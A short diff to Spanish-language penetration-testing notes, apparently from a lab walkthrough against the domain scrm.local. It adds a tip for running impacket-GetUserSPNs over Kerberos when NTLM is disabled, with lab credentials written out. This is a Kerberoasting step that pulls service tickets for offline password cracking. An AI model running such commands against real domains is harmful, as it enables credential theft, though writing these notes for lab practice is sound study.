@@ -92,3 +92,9 @@ Usaremos la herramienta de  [[IMPACKET]]
 ```shell
 impacket-GetUserSPNs scrm.local/ksimpson:ksimpson
 ```
+
+En caso de que nos este dando error al operar mediante `NTLM` por que puede ser que este deshabilitada podemos operar por `KERBEROS` con la misma herramienta pero usando
+
+```shell
+impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-host dc1.scrm.local
+```
